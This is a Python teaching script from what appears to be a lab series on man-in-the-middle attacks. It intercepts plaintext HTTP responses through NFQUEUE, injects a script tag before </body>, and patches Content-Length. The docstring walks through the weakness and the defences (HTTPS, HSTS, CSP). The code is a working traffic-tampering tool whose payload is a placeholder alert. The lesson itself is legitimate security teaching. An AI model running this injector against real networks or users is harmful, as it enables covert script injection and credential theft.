#!/usr/bin/env python3
"""
code_injector.py — inject code into HTML pages as they pass through you.

================================ THE LESSON ================================

WHERE THIS SITS
    The last of the "once you're the MITM" tools (arp_spoofer.py + IP
    forwarding + NFQUEUE, same setup as dns_spoofer.py / file_interceptor.py).
    Here the rewrite target is the HTML body of a web page.

THE WEAKNESS: PLAINTEXT HTTP PAGES CAN BE EDITED IN TRANSIT
    When a page is served over HTTP, a man in the middle sees the full HTML and
    can change it before it reaches the browser. A common demonstration is
    appending a <script> tag just before </body> — the browser trusts whatever
    arrives and runs it. That injected script could do anything the page could:
    log keystrokes, draw a fake login box, etc. This is the network-level cousin
    of stored/reflected XSS, and it is a headline reason the entire web moved to
    HTTPS.

THE TRICKY BIT: CONTENT-LENGTH MUST STAY HONEST
    HTTP responses advertise their body size in a `Content-Length` header. If we
    add bytes to the body but leave Content-Length saying the old (smaller)
    number, the browser reads a truncated page and our script is cut off. So the
    real work here is bookkeeping:
        1. Find the response's current Content-Length.
        2. Insert our script before </body>.
        3. Rewrite Content-Length = old length + len(injected code).
    That arithmetic is the actual lesson of this file — editing a protocol means
    keeping its self-describing fields consistent.

HOW IT WORKS
    NFQUEUE hands us HTTP responses (TCP sport 80). We decode the payload, use a
    regex to replace "</body>" with "<our script></body>", patch Content-Length,
    and release the packet.

=============================== THE PYTHON ================================
    * re (regex) — find/replace </body> and the Content-Length value.
    * bytes vs str — HTTP payloads are bytes; we decode to edit, re-encode to send.
    * string/number conversion — int(old) + len(code), back to str/bytes.
    * netfilterqueue + scapy — same packet-rewrite pattern as the siblings.

=========================== DEFENSIVE TAKEAWAY ===========================
    * HTTPS/TLS makes the body unreadable and tamper-evident — a MITM can't
      insert a <script> into ciphertext. Enforce HSTS so there's no HTTP to
      downgrade to.
    * Subresource Integrity (SRI) and a strict Content-Security-Policy limit
      what injected or swapped scripts can do even if they appear.
    * For the operator of a network: Dynamic ARP Inspection / 802.1X stop the
      attacker reaching the middle at all (see tools #3 and #8).

USAGE (inside your lab, as root):
    iptables -I FORWARD -j NFQUEUE --queue-num 0
    sudo python3 code_injector.py
    iptables --flush   # when done
===========================================================================
"""

import re

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import IP, TCP, Raw
from netfilterqueue import NetfilterQueue

# The code we inject. In the lab, a harmless alert proves injection worked
# without doing anything malicious. Everything stays as bytes to match payloads.
INJECTION_CODE = b"<script>alert('injected in your lab');</script>"


def set_content_length(load, delta):
    """Return `load` with its Content-Length header increased by `delta`.

    We search for "Content-Length: <digits>", pull out the number, add the
    number of bytes we injected, and substitute the new value back in. If the
    header isn't present (e.g. chunked transfer) we leave the payload untouched.
    """
    match = re.search(rb"Content-Length:\s*(\d+)", load)
    if not match:
        return load
    old_length = int(match.group(1))
    new_length = old_length + delta
    return re.sub(rb"Content-Length:\s*\d+",
                  b"Content-Length: " + str(new_length).encode(),
                  load)


def process_packet(nfq_packet):
    scapy_packet = IP(nfq_packet.get_payload())

    # Only HTTP responses (source port 80) with a body concern us.
    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP) \
            and scapy_packet[TCP].sport == 80:
        load = scapy_packet[Raw].load

        # Only touch pages that actually have a </body> to inject before.
        if b"</body>" in load:
            print("[+] HTML response seen — injecting script before </body>.")

            # 1) Insert our code immediately before the closing body tag.
            load = load.replace(b"</body>", INJECTION_CODE + b"</body>")

            # 2) Keep Content-Length honest, or the browser truncates the page.
            load = set_content_length(load, len(INJECTION_CODE))

            # 3) Write the edited body back and let scapy fix lengths/checksums.
            scapy_packet[Raw].load = load
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[TCP].chksum
            nfq_packet.set_payload(bytes(scapy_packet))

    nfq_packet.accept()


def main():
    queue = NetfilterQueue()
    try:
        queue.bind(0, process_packet)
        print("[i] Bound to NFQUEUE 0. Ctrl+C to stop.\n")
        queue.run()
    except KeyboardInterrupt:
        print("\n[i] Stopping. Don't forget: iptables --flush")
    finally:
        queue.unbind()


if __name__ == "__main__":
    main()
